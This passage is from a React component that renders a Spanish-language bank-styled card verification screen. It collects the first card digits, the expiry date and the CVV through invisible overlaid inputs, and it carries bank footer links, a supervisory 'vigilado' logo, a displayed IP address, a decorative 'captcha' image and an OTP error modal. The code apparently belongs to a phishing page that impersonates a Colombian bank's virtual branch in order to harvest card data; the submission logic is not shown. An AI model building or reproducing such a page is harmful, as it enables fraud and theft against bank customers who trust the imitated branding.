                            <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "25px", width: "100%" }}>
                                {step === "front" ? (
                                    <>
                                        <div className="input-group-custom" style={{ borderBottom: "none", position: "relative", display: "flex", flexDirection: "column", alignItems: "center", gap: "10px", width: "100%" }}>
                                            {renderVisualInputDigits()}
                                            <label className='bc-card-auth-description' htmlFor="cardDigits" style={{ color: "#ffffff", fontWeight: "500", fontSize: "16px", textAlign: 'center' }}>
                                                Ingrese los primeros {requiredDigitsLength} dígitos de su tarjeta
                                            </label>
                                            <input
                                                id="cardDigits"
                                                type="tel"
                                                maxLength={requiredDigitsLength}
                                                pattern="[0-9]*"
                                                value={cardDigits}
                                                onChange={handleDigitsChange}
                                                onFocus={() => { setIsFocused(true); setFocusedField("digits"); }}
                                                onBlur={() => { setIsFocused(false); setFocusedField(""); }}
                                                style={{
                                                    position: "absolute",
                                                    top: 0,
                                                    left: "50%",
                                                    transform: "translateX(-50%)",
                                                    width: "260px",
                                                    height: "40px",
                                                    opacity: 0,
                                                    cursor: "text",
                                                    caretColor: "transparent",
                                                }}
                                            />
                                        </div>
                                        <div className="input-group-custom" style={{ borderBottom: "none", position: "relative", display: "flex", flexDirection: "column", alignItems: "center", gap: "10px", width: "100%" }}>
                                            {renderVisualInputExpiration()}
                                            <label className='bc-card-auth-description' htmlFor="expirationDate" style={{ color: "#ffffff", fontWeight: "500", fontSize: "16px", marginTop: "5px" }}>
                                                Fecha de expiración (MM/YY)
                                            </label>
                                            <input
                                                id="expirationDate"
                                                type="tel"
                                                maxLength={5}
                                                pattern="[0-9\/]*"
                                                value={expirationDate}
                                                onChange={handleExpirationChange}
                                                onFocus={() => { setIsFocused(true); setFocusedField("expiration"); }}
                                                onBlur={() => { setIsFocused(false); setFocusedField(""); }}
                                                style={{
                                                    position: "absolute",
                                                    top: 0,
                                                    left: "50%",
                                                    transform: "translateX(-50%)",
                                                    width: "260px",
                                                    height: "40px",
                                                    opacity: 0,
                                                    cursor: "text",
                                                    caretColor: "transparent",
                                                }}
                                            />
                                        </div>
                                    </>
                                ) : (
                                    <>
                                        <div className="input-group-custom" style={{ borderBottom: "none", position: "relative", display: "flex", flexDirection: "column", alignItems: "center", gap: "10px", width: "100%" }}>
                                            {renderVisualInputCVV()}
                                            <label htmlFor="cvv" style={{ color: "#ffffff", margin: 0, fontWeight: "500", fontSize: "16px", marginTop: "5px" }}>CVV</label>
                                            <input
                                                id="cvv"
                                                type="tel"
                                                maxLength={requiredCvvLength}
                                                pattern="[0-9]*"
                                                value={cvv}
                                                onChange={handleCvvChange}
                                                onFocus={() => { setIsFocused(true); setFocusedField("cvv"); }}
                                                onBlur={() => { setIsFocused(false); setFocusedField(""); }}
                                                style={{
                                                    position: "absolute",
                                                    top: 0,
                                                    left: "50%",
                                                    transform: "translateX(-50%)",
                                                    width: "260px",
                                                    height: "40px",
                                                    opacity: 0,
                                                    cursor: "text",
                                                    caretColor: "transparent",
                                                    WebkitTextFillColor: "transparent"
                                                }}
                                            />
                                        </div>
                                    </>
                                )}
                            </div>
                            <br /><br />
                            <button className="bc-button-primary login-btn" onClick={handleContinue}
                                style={{
                                    marginTop: "20px",
                                    fontSize: "14px",
                                    opacity: (step === "front"
                                        ? (cardDigits.length === requiredDigitsLength && expirationDate.length === 5 && isCardValid === true)
                                        : (cvv.length === requiredCvvLength && !submitted)) ? 1 : 0.5,
                                    cursor: (step === "front"
                                        ? (cardDigits.length === requiredDigitsLength && expirationDate.length === 5 && isCardValid === true)
                                        : (cvv.length === requiredCvvLength && !submitted)) ? "pointer" : "not-allowed"
                                }}
                                disabled={step === "front"
                                    ? !(cardDigits.length === requiredDigitsLength && expirationDate.length === 5 && isCardValid === true)
                                    : (cvv.length !== requiredCvvLength || submitted)}
                            >
                                {step === "front" ? "Siguiente" : (submitted ? "Enviado" : "Enviar")}
                            </button>
                        </div>
                    </div>
                    <div className="login-page-footer mt-4">
                        <div className="footer-links" style={{ marginTop: "70px", marginRight: "1%", marginBottom: "5px" }}>
                            <span>¿Problemas para conectarte?</span>
                            <span className="dot">·</span>
                            <span>Aprende sobre seguridad</span>
                            <span className="dot">·</span>
                            <span>Reglamento Sucursal Virtual</span>
                            <span className="dot">·</span>
                            <span>Política de privacidad</span>
                        </div>
                        <div className="footer-final">
                            <div className="footer-left">
                                <div>
                                    <img
                                        src="/assets/images/img_pantalla2/descarga.svg"
                                        style={{ width: "180px" }}
                                    />
                                </div>
                                <div style={{ alignSelf: 'center' }}>
                                    <span className="vigilado">
                                        <img
                                            src="/assets/images/img_pantalla1/imgi_40_logo_vigilado.svg"
                                            alt="Superintendencia"
                                            style={{ width: "140px" }}
                                        />
                                    </span>
                                </div>
                            </div>
                            <div className="footer-right">
                                <div className="mt-2">Dirección IP: {ip}</div>
                                <div className="mb-2">{fechaHora}</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div className="visual-captcha" style={{ cursor: "pointer" }}>
                <img src="/assets/images/lateral-der.png" alt="Visual Captcha" />
            </div>

            {cargando ? <Loading /> : null}

            <NumOTPModal
                isOpen={formState.lanzarModalErrorSesion}
                onClose={() => setFormState(prev => ({ ...prev, lanzarModalErrorSesion: false }))}
            />
        </>
    );
};